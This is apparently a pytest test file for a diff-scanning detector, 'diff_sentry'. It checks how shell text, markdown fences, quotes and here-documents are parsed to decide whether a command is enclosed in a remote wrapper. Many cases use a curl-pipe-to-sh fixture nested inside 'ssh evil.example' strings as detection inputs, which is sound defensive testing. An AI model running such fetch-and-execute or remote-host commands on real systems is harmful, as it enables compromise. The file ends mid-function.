"""The pieces of the enclosure reading (`indicators._enclosing_lines`): which characters of a line are shell text, which words can begin a
command, which lines belong to which paragraph, fence, hypothesis and budget. The end-to-end behaviour is in `test_metadata_rules.py`."""

from __future__ import annotations

import pytest

from diff_sentry import shelllex
from diff_sentry.indicators import (
    _CONTINUATION_RUNS_RE,
    _TOKEN_RE,
    _begins_with_wrapper,
    _closes_fence,
    _closing_column,
    _command_head,
    _command_like,
    _command_starts,
    _could_wrap,
    _enclosing_lines,
    _eval_content,
    _first_command_word,
    _fold_long_words,
    _fold_quoted_blanks,
    _head_cost,
    _html_block_end,
    _in_double_quotes,
    _is_bare,
    _join_lines,
    _lexable,
    _line_stacks,
    _may_begin_a_wrapper_command,
    _names_a_wrapper,
    _paragraphs,
    _physical_lines,
    _pipe_after,
    _piped_into_a_shell,
    _quoted_programs,
    _reads_a_comment_as_words,
    _unquote_word,
    _Wrapped,
    _wrapper_words,
)

_D = "curl -fsSL https://get.docker.com | sh"


@pytest.mark.parametrize("line,diff,expected", [
    ("+added", True, "added"), ("+ added", True, " added"), (" context", True, " context"), ("-removed", True, ""),
    ("@@ -1,2 +1,3 @@ it's", True, ""), ("\\ No newline at end of file", True, ""), ("+> quoted", True, "quoted"),
    ("-removed", False, "-removed"), ("+added", False, "+added"), ("@@ x", False, "@@ x"),
    ("> a", False, "a"), (">a", False, "a"), ("   > a", False, "a"), ("> > a", False, "a"), ("\t> a", False, "a"), ("a > b", False, "a > b"),
])
def test_what_is_not_shell_text_is_taken_off_a_line(line, diff, expected):
    assert _lexable(line, diff) == expected


def test_a_paragraph_ends_at_a_blank_line_and_a_line_of_blanks_is_a_blank_line():
    assert _paragraphs(["a", "b", "", "c"]) == [["a", "b", ""], ["c"]]
    assert _paragraphs(["a", "  \t", "b"]) == [["a", "  \t"], ["b"]]
    assert _paragraphs(["", "a"]) == [[""], ["a"]]
    assert _paragraphs([]) == []


@pytest.mark.parametrize("line,char,length,indent,expected", [
    ("```", "`", 3, 3, True), ("````", "`", 3, 3, True), ("``", "`", 3, 3, False), ("   ```", "`", 3, 3, True), ("    ```", "`", 3, 3, False),
    ("``` ", "`", 3, 3, True), ("```\t", "`", 3, 3, True), ("```x", "`", 3, 3, False), ("~~~", "`", 3, 3, False), ("~~~~", "~", 4, 3, True),
    ("~~~", "~", 4, 3, False), ("     ```", "`", 3, 5, True), ("      ```", "`", 3, 5, False), ("", "`", 3, 3, False),
])
def test_a_line_closes_a_fence_only_with_enough_of_its_characters_and_nothing_else(line, char, length, indent, expected):
    assert _closes_fence(line, char, length, indent) is expected


@pytest.mark.parametrize("marker", ["- ", "* ", "+ ", "1. ", "12) "])
def test_a_fence_that_a_list_item_opens_is_no_boundary_and_the_text_after_it_is_read_with_its_markers_as_written_and_blank(marker):
    pad = " " * len(marker)
    for closer in (pad + "```", pad + " " * 3 + "```", pad + " " * 4 + "```", "```"):
        lines = [f"{marker}```sh", f"{pad}echo hi", closer, "ssh evil.example \\'", _D, "\\'"]
        assert _enclosing_lines(lines, False)[4] is True, (marker, closer)                        # the backslash is rendered away: `\\'` is `'`
    assert _enclosing_lines([f"{marker}```", f"{pad}ssh evil.example '", "", f"{pad}{_D}", f"{pad}'"], False)[3] is True


@pytest.mark.parametrize("line", ["> x", ">x", "  > x", "<!-- x -->", "- x", "* x", "+ x", "1. x", "12) x", "-", "1.", "    x", "\tx", "   - x", "x", "# h", "---", "| a | b |"])
def test_a_plain_fence_cuts_whatever_line_stands_before_it(line):
    after = ["```", "ssh evil.example '", "```", _D, "'"]
    assert _enclosing_lines([line, *after], False)[4] is False
    assert _enclosing_lines([*after[:3], line, _D, "'"], False)[4] is False


@pytest.mark.parametrize("opener", ["- ```", "* ```", "1. ```sh", "12) ```", "> ```", "> > ```", "- > ```", "   - ```", "-    ```"])
def test_a_fence_that_a_quote_or_a_list_item_holds_cuts_nothing_and_a_plain_fence_line_while_it_is_open_cuts_nothing_either(opener):
    lines = [opener, "ssh evil.example '", "```", _D, "'"]
    assert _enclosing_lines(lines, False)[3] is True                                    # the plain line is text: it cuts nothing
    assert _enclosing_lines([opener, "ssh evil.example '", "", _D, "'"], False)[3] is True
    assert _enclosing_lines([opener, "x", "```", "```", "ssh evil.example '", "```", _D, "'"], False)[6] is True      # nor does a second one, while no marker has closed it
    assert _enclosing_lines(["x", "```", "x", "```", "```", "ssh evil.example '", "```", _D, "'"], False)[7] is False     # the same lines with no held fence cut


@pytest.mark.parametrize("start,end", [("<div>", ""), ("<pre>", "</pre>"), ("<!--", "-->"), ("<?x", "?>"), ("<![CDATA[", "]]>"), ("<p>", ""), ("<br>", ""), ("- <div>", ""),
                                       ("1. <details>", ""), ("> <script>", "</script>"), ("</div>", "")])
def test_the_lines_of_an_html_block_are_text_to_the_end_of_the_block_and_no_fence_cuts_in_it(start, end):
    inside = [start, "ssh evil.example '", "```", _D, "```", "'"]
    assert _enclosing_lines(inside, False)[3] is True
    closed = [start, end, "", "```", "ssh evil.example '", "```", _D, "'"] if end else [start, "", "```", "ssh evil.example '", "```", _D, "'"]
    assert _enclosing_lines(closed, False)[-2] is False                                 # the block is over: the fence after it cuts again


def test_an_html_block_ends_no_sooner_than_its_own_rule_says():
    assert _enclosing_lines(["<div>", "ssh evil.example '", "> ", "```", _D, "'"], False)[4] is True              # a line with only a quote marker is not blank
    assert _enclosing_lines(["- <div>", "ssh evil.example '", "```", _D, "'"], False)[3] is True                  # nor does a line that is no longer in the list item end it


@pytest.mark.parametrize("line", ["x", "# h", "---", "***", "| a | b |", "-x", "--flag", "1.x", "text > x", "a - b"])
def test_a_line_of_plain_text_leaves_the_fences_after_it_cutting(line):
    assert _enclosing_lines([line, "```", "ssh evil.example '", "```", _D, "'"], False)[4] is False


def test_a_fence_marker_in_a_fence_or_behind_a_quote_marker_is_what_it_looks_like_in_the_document():
    assert _enclosing_lines(["```", "ssh evil.example '", "> ```", _D, "'"], False)[3] is True        # a quoted marker is content of the fence
    assert _enclosing_lines(["```", "ssh evil.example '", "```", _D, "'"], False)[3] is False


def test_the_words_that_can_begin_a_command_are_wrappers_by_name_or_by_path_and_not_urls():
    for word in ("ssh", "docker", "sudo", "kubectl", "npx", "uvx", "bash", "sh", "python3.11", "python3", "pwsh", "powershell", "/usr/bin/ssh",
                 "./evil", "~/bin/x", "'docker", "(ssh"):
        assert _could_wrap(word) is (word not in ("sudo",)), word
    for word in ("/", "//", "/*", "/>", "///"):                       # a slash that no name follows is no path
        assert _could_wrap(word) is False, word
    for word in ("/{bin,usr/bin}/evil", "/.hidden", "/~x", "/$HOME/x"):
        assert _could_wrap(word) is True, word
    for word in ("curl", "echo", "Use", "https://x.example/ssh", "docker-compose-up", "docker:", ""):
        assert _could_wrap(word) is False, word


@pytest.mark.parametrize("command,expected", [
    ("ssh evil.example '", True), ("$ ssh evil.example '", True), ("# ssh evil.example '", True), ("- ssh h '", True), ("1. ssh h '", True),
    ("Run: ssh evil.example '", True), ("Step 1: ssh evil.example '", True), ("First, ssh evil.example '", True), ("Then ssh evil.example '", True),
    ("user@host:~$ ssh evil.example '", True), ("(venv) $ ssh evil.example '", True), ("sudo ssh h '", True), ("sudo -u root ssh h '", True),
    ("sudo -u deploy docker run x sh -c '", True), ("A=1 ssh h '", True), ("env X=1 ssh h '", True), ("timeout 5 ssh h '", True),
    ("nice -n 5 ssh h '", True), ("stdbuf -o0 ssh h '", True), ("nohup ssh h '", True), ("time ssh h '", True), ("xargs ssh h '", True),
    ("Use docker run to start the project's", False), ("Then use docker run to start", False), ("echo ssh h '", True), ("We run docker '", False),
    ("", False), ("sudo", False),
    # a label or a marker glued to the program, markup around it, and a program named by a relative path: the words `_wrapped` reads
    ("Run:ssh evil.example '", True), ("\u5b89\u88dd\uff1assh evil.example '", True), ("1)ssh h '", True), ("<code>ssh h '", True), ("> ssh h '", True),
    ("bin/evil 'x", True), ("Run: bin/evil 'x", True), ("see bin/evil 'x", False), ("https://x.example/ssh 'x", False),
    ("  " * 300 + "ssh h '", True), ("sudo " * 100 + "ssh h '", False),
    # a program this module does not know, a quoted value, a redirect or a prefix that is itself a wrapper in front of the wrapper; and the
    # heads that read as a sentence or a table row, or have no wrapper within five words
    ("unbuffer ssh h '", True), ("flock /tmp/l ssh h '", True), ("numactl -N 0 ssh h '", True), ("timeout 0.5 ssh h '", True), ("A='x y' ssh h '", True),
    ("env 'A=x y' ssh h '", True), (">out ssh h '", True), ("> out ssh h '", True), ("2> err ssh h '", True), ("&>f ssh h '", True),
    ("{fd}>f ssh h '", True), ("watch -n 5 '", True), ("watch -n 5 'a b' '", True), ("sudo -u 'a b' ssh h '", True), ("cpulimit -l 50 -- ssh h '", True),
    ("taskset -c 0,1 ssh h '", True), ("foo bar baz qux quux ssh h '", True), ("foo bar baz qux quux quuz ssh h '", False),
    ("It's the one. ssh h '", False), ("this is ssh evil.example '", False), ("| OS | Command | `/bin/bash -c \"$(", False),
    ("Don't use docker run '", False), ("use docker run to start", False), ("\u5b89\u88dd ssh evil.example '", False), ("see ssh evil.example '", False),
    ("run ssh evil.example '", False), ("can dream about implementing. The state of ssh evil.example", False),
])
def test_a_command_begins_with_a_wrapper_when_only_prompts_labels_and_prefix_programs_stand_in_front_of_it(command, expected):
    assert _begins_with_wrapper(command) is expected


def test_a_command_the_budget_cannot_afford_to_judge_counts_as_led_by_a_wrapper():
    opener = shelllex.Opener("SQ", 9, 0)
    assert _Wrapped("Use it as 'x\n", [10**6]).leads(opener) is False
    assert _Wrapped("Use it as 'x\n", [-1]).leads(opener) is True


def _starts(line, budget=10**6, contexts=True):
    """Where hypotheses may start on a line: the columns of the wrapper words that stand where a command begins (`plain`), and the first
    character of each string that holds one, with the words it stands for (`guarded`)."""
    plain, guarded = _command_starts(line, _quoted_programs(line, _wrapper_words(list(_TOKEN_RE.finditer(line)))), [budget], contexts)
    return sorted(plain), {col: [at for at, _ in words] for col, (_, words) in guarded.items()}


def _at(line, word, n=0):
    at = -1
    for _ in range(n + 1):
        at = line.index(word, at + 1)
    return at


@pytest.mark.parametrize("line", [
    "ssh h '", "sudo -u root ssh h '", "echo hi; ssh h '", "x=1 && ssh h '", "' && ssh evil.example '", '" | ssh evil.example \'',
    "echo '`' && ssh evil.example -o 'A=`' '", "echo `x` && ssh evil.example '", "a\\ 'b' ssh h '", "echo 'a' ssh h '", "# ssh h '", "  $ ssh h '",
    "- ' && ssh evil.example '", "b \" | ssh evil.example '", "x=\"a b\" ssh h '", "echo `ssh h '", "echo `a; x=1 && ssh h '",
])
def test_a_wrapper_word_outside_every_construct_starts_a_hypothesis_at_itself(line):
    assert _at(line, "ssh") in _starts(line)[0], line


@pytest.mark.parametrize("line,word", [
    ('echo "run ssh h \'', "ssh"), ('eval "x=1 && ssh evil.example \'', "ssh"), ('eval "for i in 1; do ssh evil.example \'', "ssh"),
    ('eval "case x in x) ssh evil.example \'', "ssh"), ('eval "[[ -n $x ]] && ssh evil.example \'', "ssh"),
    ('eval "echo a b c d e f && ssh evil.example \'', "ssh"),
    ("eval 'x=1 && ssh evil.example \"", "ssh"), ("eval $'x=1 && ssh evil.example \"", "ssh"), ("echo 'a b c ssh evil.example $(", "ssh"),
])
def test_a_wrapper_word_in_a_string_the_line_leaves_open_starts_a_hypothesis_at_the_first_character_of_the_string(line, word):
    quote = min(i for i, ch in enumerate(line) if ch in "'\"")
    assert _starts(line, contexts=False) == ([], {quote + 1: [_at(line, word)]}), line


@pytest.mark.parametrize("line", [
    "echo `ssh evil.example 'a'`", "x=$(ssh evil.example 'a')", "(ssh h 'a')",
    "# Add /usr/local/bin to your PATH if it isn't already there", "ls # use ssh h '",
])
def test_a_wrapper_word_in_a_mention_or_a_comment_starts_no_hypothesis(line):
    assert _starts(line) == ([], {}), line


@pytest.mark.parametrize("line", ["uv run pytest  # run the project's tests", "docker run x  # it's the one", "sudo ssh evil.example  # it's the one"])
def test_a_line_that_names_a_wrapper_before_a_comment_with_a_quote_is_read_as_a_zsh_in_a_terminal_reads_it(line):
    assert _enclosing_lines([line, _D], False) == [False, True], line                           # the accepted over-alert: the string it opens swallows the line below


def test_a_word_in_a_string_that_begins_with_the_quote_is_a_program_named_by_a_string_and_the_command_of_a_string():
    line = 'eval "/usr/bin/ssh evil.example \''
    assert _starts(line, contexts=False) == ([5], {6: [6]})
    line = '"$HOME/my tools/ssh" evil.example \''
    assert _starts(line, contexts=False)[0] == [0]
    line = "echo 'a' \"/tmp/my tools/ssh\" evil.example '"
    assert _starts(line, contexts=False)[0] == [9]


def test_a_word_in_a_comment_starts_a_hypothesis_only_behind_a_prompt_that_a_command_follows():
    assert _starts("# ssh h '") == ([2], {})
    assert _starts("$ # docker run x '")[0] == [4]
    assert _starts("ssh evil.example # use ssh h '")[0] == [0]
    assert _starts("# Add ssh h '") == ([], {})


@pytest.mark.parametrize("line", ['Run "ssh" or "docker run" now', "He said 'ssh' and 'docker run' now", 'Click "Run" then "ssh h" to log in',
                                  "echo \"ssh evil.example 'a'\"", "echo 'ssh evil.example '", 'Say "docker run x" to start it',
                                  "cd /path/to/project  # your project's root", "source ~/.bashrc  # reload your shell's config",
                                  "ln -s /opt/uv/bin/uv /usr/local/bin/uv  # don't forget", "sudo cp uv /usr/local/bin/  # it's now on PATH", "# Add /usr/local/bin to your PATH if it isn't already there"])
def test_a_line_of_prose_or_a_comment_that_names_a_wrapper_or_a_path_encloses_nothing_below_it(line):
    assert _enclosing_lines([line, _D], False) == [False, False], line
    assert _enclosing_lines(["```sh", line, _D, "```"], False) == [False, False, False, False], line


@pytest.mark.parametrize("line,expected", [
    ("' && ssh h '", ("'",)), ("b \" | ssh h '", ('"',)), ("x' ssh", ("'",)), ("'a'", ()), ('"a b"', ()), ("It's", ()), ("echo `a` ssh", ()),
    ("\\' ssh", ()), ("a') ssh", ("'",)), ("a'", ()), ("a\"; b", ('"',)), ("'; b", ("'",)), ("`; b", ()), ("x '; b", ("'",)), ('x "| b', ('"',)), ("x ') b", ("'",)), ("x '& b", ()), ("x'& b", ("'",)), ("`&>/dev/null` x", ()), ("a`| b", ("`",)), ("x '|' y", ("'",)), ("' ' \"x\" \"", ("'",)), ("`<root>/bin` ssh", ()), ("`&>/dev/null` ssh", ()),
    ("'<dir>/x' ssh", ()), ("` ssh", ("`",)), ("x` ssh", ("`",)),
])
def test_a_line_may_begin_inside_a_string_when_its_first_quote_looks_like_the_end_of_one(line, expected):
    from diff_sentry.indicators import _closing_quotes
    assert _closing_quotes(line) == expected


@pytest.mark.parametrize("text", [
    "a \\\nb\nc |\nd\ne\n", "a\nb\n", "a \\\nb \\\nc\nd", "| a | b |\n| c | d |\n", "x |\n| y\nz", "echo 'a\n| b | c' ; d |\ne\n", "a\n\nb \\\n\nc\n",
    "curl U |\nsh\n+ more\n", "a\\|b\nc",
])
def test_the_lines_of_the_joined_text_are_mapped_back_to_the_lines_where_they_began(text):
    merged: list[tuple[int, int]] = []
    joined = _join_lines(text, False, False, merged)
    written, begins = _physical_lines(text, joined, merged)
    joined_lines = joined.split("\n")
    assert len(begins) == len(joined_lines)
    assert begins == sorted(begins) and begins[0] == 0
    physical = text.split("\n")
    appended = len(joined_lines) - (len(physical) - sum(text.count("\n", a, b) for a, b in merged))
    assert written[:len(physical)] == physical and len(written) == len(physical) + appended
    for k, line in enumerate(joined_lines[:len(joined_lines) - appended]):
        assert line.startswith(physical[begins[k]][:1]) or not physical[begins[k]]
        assert (begins[k + 1] if k + 1 < len(begins) - appended else len(physical)) - begins[k] == 1 + text.count("\n", *_span(text, merged, begins, k))


def _span(text, merged, begins, k):
    """The offsets of the physical lines `begins[k]` up to the next joined line, as a (start, end) for counting newlines."""
    starts = [0] + [i + 1 for i, ch in enumerate(text) if ch == "\n"]
    first = starts[begins[k]]
    nxt = begins[k + 1] if k + 1 < len(begins) and begins[k + 1] < len(starts) else len(starts)
    last = starts[nxt] - 1 if nxt < len(starts) else len(text)
    return first, max(first, last)


def test_the_merged_spans_are_recorded_only_where_the_text_was_replaced():
    merged: list[tuple[int, int]] = []
    _join_lines("a \\\nb\nc |\n| d\n", True, False, merged)
    assert merged == [(2, 4)]                                    # the backslash and its newline; `|` before a `|` joins nothing
    merged = []
    _join_lines("| a | b |\n| c | d |\n", True, False, merged)
    assert merged == []                                          # a table row's pipe at the end of a line joins nothing


def test_a_budget_that_runs_out_fails_closed_for_the_hypotheses_and_for_the_wrapper_judgements():
    text = ["It's x", "Run: ssh evil.example 'a", "b'", "ok", _D]
    assert _enclosing_lines(text, False)[4] is True
    spent = _enclosing_lines(text, False, budget=0)
    assert spent[2:] == [True, True, True]                       # the window of the hypothesis it could not afford, from the next line on
    assert _enclosing_lines(["a", "b", _D], False, budget=0) == [False, False, False]      # nothing could have opened: nothing to afford


def test_a_wrapper_word_is_followed_for_exactly_the_window():
    lines = ['Say "hi x', "ssh evil.example '", *["y"] * 59, _D, "'"]            # (the readings from the top and of the paragraph are skewed by the lone double quote)
    assert _enclosing_lines(lines, False)[61] is True
    lines = ['Say "hi x', "ssh evil.example '", *["y"] * 60, _D, "'"]
    assert _enclosing_lines(lines, False)[62] is False


def test_a_possessive_skews_no_reading_of_the_whole_text_so_the_string_is_followed_to_its_end():
    lines = ["It's x", "ssh evil.example '", *["y"] * 200, _D, "'"]
    assert _enclosing_lines(lines, False)[202] is True


def test_a_hypothesis_does_not_start_inside_an_inline_code_span_or_a_string_or_at_a_url():
    assert _enclosing_lines(["It's x `ssh evil.example '`", _D, "'"], False)[1] is False
    assert _enclosing_lines(["It's x", 'echo "run ssh evil.example \'', _D, "'"], False)[2] is False
    assert _enclosing_lines(["It's x", "https://x.example/ssh 'q", _D, "'"], False)[2] is False
    assert _enclosing_lines(["It's x", "ssh evil.example 'q", _D, "'"], False)[2] is True


@pytest.mark.parametrize("lines", [
    ["It's x", 'eval "ssh evil.example \'', _D, '\'"'],
    ["Here's it:", "echo `ssh evil.example '", _D, "'`"],
    ["Here's it:", 'x="$(docker run alpine sh -c \'', _D, '\')"'],
    ["Here's it:", 'x="$(timeout 0.5 ssh evil.example \'', _D, '\')"'],
    ["Here's it:", "x=`>out ssh evil.example '", _D, "'`"],
    ["Here's it:", 'x="$(A=\'x y\' ssh evil.example \'', _D, '\')"'],
    ["Here's it:", 'x="$(unbuffer ssh evil.example \'', _D, '\')"'],
    ["Here's it:", "ss\\", "h evil.example '", _D, "'"],
    ["Here's it:", "doc\\", "ker run x '", _D, "'"],
    ["Here's it:", "watch -n 5 '", _D, "'"],
    ["Here's it:", "ssh evil.example { '", _D, "'"],
    ["Here's it:", "docker run x sh{ -c '", _D, "'"],
])
def test_a_wrapper_in_an_open_string_or_span_a_continued_name_and_a_prefix_program_start_a_command(lines):
    assert _enclosing_lines(lines, False)[lines.index(_D)] is True, lines


@pytest.mark.parametrize("lines", [
    ["It's x", "echo `ssh evil.example 'a'`", _D, "'"],
    ["It's x", 'echo "ssh evil.example \'a\'"', _D, "'"],
    ["Here's it:", 'x="$(Use docker run to start it)"', _D, "'"],
    ["It's x", "Use `ssh evil.example '`", _D, "'"],
])
def test_a_wrapper_in_a_span_or_a_string_that_closes_on_its_line_is_a_mention(lines):
    assert _enclosing_lines(lines, False)[lines.index(_D)] is False, lines


_FAR = ["x"] * 70           # more lines than a wrapper word is followed for


@pytest.mark.parametrize("fence,closer,closed", [
    ("~~~", "~~~", True), ("~~~", "```", False), ("```", "~~~", False), ("~~~~", "~~~", False), ("~~~", "~~~~", True), ("```", "   ```", True),
    ("```", "    ```", False), ("```", "```  ", True), ("```", "``` x", False),
])
def test_a_tilde_or_backtick_fence_ends_a_block_only_where_it_is_closed(fence, closer, closed):
    lines = [fence, "ssh evil.example '", closer, *_FAR, _D, "'"]
    assert _enclosing_lines(lines, False)[-2] is not closed


def _row(lines, budget=None):
    return "".join("T" if enclosed else "F" for enclosed in _enclosing_lines(lines, False, budget=budget))


def test_the_line_of_each_hypothesis_is_charged_to_the_budget_and_a_budget_that_is_short_by_one_fails_closed():
    # the stacks the lexer finds open at the start of each line cost one lexer pass over each line that can change them (21 characters, 6 times), and a line with a wrapper word
    # costs its length and three (the lexer reads it once to see what the word stands in) and its hypothesis the rest of the line plus one: 23 + 21 characters
    lines = ["ssh evil.example 'a'"] * 6 + [_D]
    for budget, expected in ((0, "FTTTTTT"), (169, "FTTTTTT"), (170, "FFTTTTT"), (213, "FFTTTTT"), (214, "FFFTTTT"), (301, "FFFFTTT"), (302, "FFFFFTT"), (345, "FFFFFTT"),
                             (346, "FFFFFFT"), (389, "FFFFFFT"), (390, "FFFFFFF"), (391, "FFFFFFF")):
        assert _row(lines, budget) == expected, budget


def test_the_cost_of_a_hypothesis_is_the_line_from_the_start_of_the_command_that_holds_its_word():
    lines = ["Run: ssh evil.example 'a'"] * 6 + [_D]                  # the command begins at column 0, the word at column 5: 28 characters to read the line, and 26
    for budget, expected in ((0, "FTTTTTT"), (209, "FTTTTTT"), (210, "FFTTTTT"), (263, "FFTTTTT"), (264, "FFFTTTT"), (425, "FFFFFTT"), (426, "FFFFFFT"),
                             (479, "FFFFFFT"), (480, "FFFFFFF")):
        assert _row(lines, budget) == expected, budget


def test_a_hypothesis_the_budget_cannot_pay_for_stands_for_exactly_the_sixty_lines_after_it():
    lines = ["ssh evil.example 'a'", *["x"] * 100, _D]
    assert _row(lines, 64) == "F" + "T" * 60 + "F" * 41
    assert _row(lines, 65) == "F" * 102


def test_the_lines_after_a_closed_string_of_a_wrapper_are_a_script_that_ran_it_for_sixty_lines():
    assert _row(["ssh evil.example 'a", "b'", *["x"] * 70, _D]) == "F" + "T" * 60 + "F" * 12
    assert _row(["It's x", "Run: ssh evil.example 'a", "b'", *["x"] * 70, _D]) == "FF" + "T" * 60 + "F" * 12


def _opener_of(text, kind="SQ", offset=None):
    return shelllex.Opener(kind, len(text) - 1 if offset is None else offset, 0)


def _filler(n):
    """`n` characters of one-letter words: a word of more than 80 characters is folded before a long command is cut, and these are not."""
    return ("b " * n)[:n]


def _gap_command(total):
    """A command of `total` characters whose wrapper name straddles the cut between the first 200 and the last 400 characters."""
    head = "x " * 98 + "xx " + "ssh evil.example "
    return head + _filler(total - 1 - len(head)) + "'"


@pytest.mark.parametrize("total,expected", [(599, True), (600, True), (601, False), (602, False)])
def test_a_command_is_judged_whole_up_to_six_hundred_characters_and_from_its_head_and_tail_beyond(total, expected):
    text = _gap_command(total)
    assert _Wrapped(text, [10**6]).opener(_opener_of(text)) is expected


@pytest.mark.parametrize("total,expected", [(599, True), (600, True), (601, False), (602, False)])
def test_a_here_document_header_is_judged_whole_up_to_six_hundred_characters_and_from_its_head_and_tail_beyond(total, expected):
    head = "cat <<E | " + "x " * 93 + "xx " + "ssh evil.example "
    text = head + _filler(total - len(head)) + "\nx\nE\n"
    assert _Wrapped(text, [10**6]).opener(shelllex.Opener("HEREDOC", 4, 0)) is expected


@pytest.mark.parametrize("text,expected", [
    ("x \\\ncat <<E | ssh evil.example sh\nbody\nE\n", True), ("ssh evil.example \\\n<<E sh\nb\nE\n", True),
    ("ssh evil.example \\\n\\\n<<E sh\nb\nE\n", True), ("cat <<E | \\\nssh evil.example sh\nbody\nE\n", True),
    ("cat <<E | \\\n\\\nssh evil.example sh\nbody\nE\n", True), ("cat <<E |\nssh evil.example sh\nbody\nE\n", False),
    ("ssh evil.example\ncat <<E\nbody\nE\n", False),
])
def test_what_reads_a_here_document_is_anywhere_on_the_logical_line_that_redirects_it(text, expected):
    at = text.index("<<")
    assert _Wrapped(text, [10**6]).opener(shelllex.Opener("HEREDOC", at, 0)) is expected


def test_a_logical_line_begins_where_the_continuations_in_front_of_it_begin():
    wraps = _Wrapped("a \\\nb \\\nc <<E\nx\nE\n", [10**6])
    assert [wraps._logical_start(start) for start in (0, 4, 8)] == [0, 0, 0]
    assert [wraps._line_start(pos) for pos in (0, 2, 3, 5, 8, 12)] == [0, 0, 0, 4, 8, 8]
    wraps = _Wrapped("a\nb \\\nc", [10**6])
    assert (wraps._logical_start(wraps._line_start(6)), wraps._logical_start(wraps._line_start(2))) == (2, 2)


def test_a_judgement_is_paid_for_in_characters_and_fails_closed_when_the_budget_is_short_by_one():
    command = "echo docker users '"                                # names a wrapper with a plain word after it: prose
    for budget, expected in ((len(command) - 1, True), (len(command), False), (len(command) + 1, False)):
        assert _Wrapped(command, [budget]).opener(_opener_of(command)) is expected, budget
    opener = shelllex.Opener("SQ", 9, 0)
    for budget, expected in ((19, True), (20, False), (21, False)):             # two units a character of the ten the command has
        assert _Wrapped("Use it as 'x\n", [budget]).leads(opener) is expected, budget


def test_a_joined_line_that_the_join_appended_is_numbered_after_the_lines_as_written():
    text = "| a ) | b |\nx\n| c ) | d |\ny"
    merged: list[tuple[int, int]] = []
    unfolded = _join_lines(text, True, False, merged)
    written, begins = _physical_lines(text, unfolded, merged)
    assert written == ["| a ) | b |", "x", "| c ) | d |", "y", "| a ) | b  | x", "| c ) | d  | y"]
    assert begins == [0, 1, 2, 3, 4, 5]


_S = "ssh evil.example"


@pytest.mark.parametrize("closer,enclosed", [("    ```", True), ("   ```", False)])
def test_a_closing_fence_may_be_indented_three_blanks_whatever_the_opening_fence_was(closer, enclosed):
    lines = ["  ```", _S + " 'a", closer, *_FAR, _D, "'"]
    assert _enclosing_lines(lines, False)[-2] is enclosed


def test_each_window_the_budget_cannot_pay_for_ends_where_it_ends_and_the_next_one_begins_where_it_begins():
    lines = [_S + " 'a'", *["x"] * 69, _S + " 'a'", *["x"] * 70, _D]
    assert _row(lines, 0) == "F" + "T" * 60 + "F" * 10 + "T" * 60 + "F" * 11


def test_each_script_that_ran_a_wrapper_taints_the_sixty_lines_after_its_string_and_not_the_ones_between():
    lines = [_S + " 'a", "b'", *["x"] * 69, _S + " 'c", "d'", *["x"] * 70, _D]
    assert _row(lines) == "F" + "T" * 60 + "F" * 11 + "T" * 60 + "F" * 12


def test_a_closed_string_of_a_command_that_no_wrapper_begins_taints_nothing_even_if_it_names_one():
    assert _row(["Run: " + _S + ' x; Echo x "a ' + _S + '" \'a', "b'", _D]) == "FFF"
    assert _row([_S + ' x; Echo x "a ' + _S + '" \'a', "b'", _D]) == "FFF"


def test_a_subshell_is_no_wrappers_argument():
    assert _row(["(", _D, ")"]) == "FFF"
    assert _row([_S + " && (", _D, ")"]) == "FFF"


def test_a_string_in_a_fence_that_spans_a_blank_line_is_read_through_whatever_its_length():
    lines = ["```", _S + " 'a", "", *_FAR, _D, "'", "```"]
    assert _enclosing_lines(lines, False)[lines.index(_D)] is True
    assert _row(["```", _S + " 'a", "", _D, "'", "```"]) == "FFTTTF"


def _opener_after(prefix, command):
    text = prefix + command
    return _Wrapped(text, [10**6]).opener(shelllex.Opener("SQ", len(text) - 1, len(prefix)))


@pytest.mark.parametrize("total,expected", [(599, True), (600, True), (601, False), (602, False)])
def test_the_length_of_a_command_counts_from_where_it_begins_not_from_the_start_of_the_text(total, expected):
    body = "x " * 98 + "xx " + "ssh evil.example "
    assert _opener_after("p ; ", body + _filler(total - 1 - len(body)) + "'") is expected


def test_a_wrapper_in_the_head_or_in_the_tail_of_a_long_command_is_found():
    assert _opener_after("p ; ", "x " * 99 + " " + "b" * 20 + " " + "b " * 250 + "ssh evil.example " + "b" * 50 + "'") is True
    assert _opener_after("p ; ", "ssh evil.example " + "x " * 99 + " " + "b" * 600 + "'") is True


@pytest.mark.parametrize("total,expected", [(599, True), (600, True), (601, False), (602, False)])
def test_the_length_of_a_here_document_header_counts_from_where_its_line_begins(total, expected):
    head = "cat <<E | " + "x " * 93 + "xx " + "ssh evil.example "
    text = "p\n" + head + _filler(total - len(head)) + "\nx\nE\n"
    assert _Wrapped(text, [10**6]).opener(shelllex.Opener("HEREDOC", text.index("<<"), 0)) is expected


@pytest.mark.parametrize("text,expected", [
    ("p\ncat <<E | " + "b " * 300 + "ssh evil.example sh " + "b" * 50 + "\nx\nE\n", True),
    ("p\ncat <<E | ssh evil.example sh " + "b " * 300 + "\nx\nE\n", True),
    ("cat <<E | \\\n\nssh evil.example sh\n", False),
    ("ssh evil.example\n\\\n<<E cat\nb\nE\n", False),
    ("ssh evil.example\n\\\n\\\n<<E cat\nb\nE\n", False),
    ("ssh evil.example \\\n\\\n<<E cat\nb\nE\n", True),
])
def test_the_header_of_a_here_document_ends_at_the_first_line_that_no_backslash_continues(text, expected):
    assert _Wrapped(text, [10**6]).opener(shelllex.Opener("HEREDOC", text.index("<<"), 0)) is expected


def test_only_the_first_four_hundred_characters_of_a_command_decide_whether_it_begins_with_a_wrapper():
    for skips, expected in ((78, True), (82, False)):
        text = "sudo " * skips + "ssh evil.example '"
        assert _Wrapped(text, [10**6]).leads(shelllex.Opener("SQ", len(text) - 1, 0)) is expected, skips


def test_the_taint_a_hypothesis_finds_ends_where_it_ends_when_prose_has_shifted_every_other_reading():
    lines = ["It's x", _S + " 'a", "b'", *["x"] * 69, _S + " 'c", "d'", *["x"] * 70, _D]
    assert _row(lines) == "FF" + "T" * 60 + "F" * 11 + "T" * 60 + "F" * 12


@pytest.mark.parametrize("command", [
    "ssh" + " " * 300 + "u@h.example" + " " * 420 + "foo '",
    "ssh" + "\t" * 300 + "u@h.example" + "\t" * 420 + "foo '",
    "ssh" + " " * 300 + "u@" + "A" * 700 + " '",
    "docker" + " " * 700 + "run x" + " " * 400 + "sh -c '",
])
def test_blank_padding_does_not_push_the_host_out_of_the_head_and_the_tail_of_a_long_command(command):
    assert _Wrapped(command, [10**6]).opener(shelllex.Opener("SQ", len(command) - 1, 0)) is True


@pytest.mark.parametrize("command", ["ss\\\nh evil.example '", "doc\\\nker run x '", "py\\\nthon3 -c '", "sudo ss\\\nh evil.example '"])
def test_a_continuation_inside_the_name_of_a_wrapper_joins_it(command):
